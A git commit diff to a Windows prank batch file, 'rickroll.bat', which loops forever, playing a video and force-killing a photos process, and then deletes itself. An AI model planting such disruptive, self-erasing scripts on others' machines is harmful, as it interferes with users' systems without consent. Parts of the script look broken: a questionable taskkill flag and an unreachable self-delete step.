981d6f37f77e6087764732ad5f2d34962833b069
YumYummity <103061664+YumYummity@users.noreply.github.com>
2022-04-29 19:55:17 -0400

    Update rickroll.bat

--- install/rickroll.bat
+++ install/rickroll.bat
@@ -1,5 +1,9 @@
-timeout /t 10 /nobreak
+timeout /t 3 /nobreak
+:loop
 start "" rickroll.mp4
+timeout /t 10 /nobreak
+taskkill /f /q photos
+goto :loop
 call :deleteSelf&exit
 :deleteSelf
 start /b "" cmd /c del "%~f0"&exit
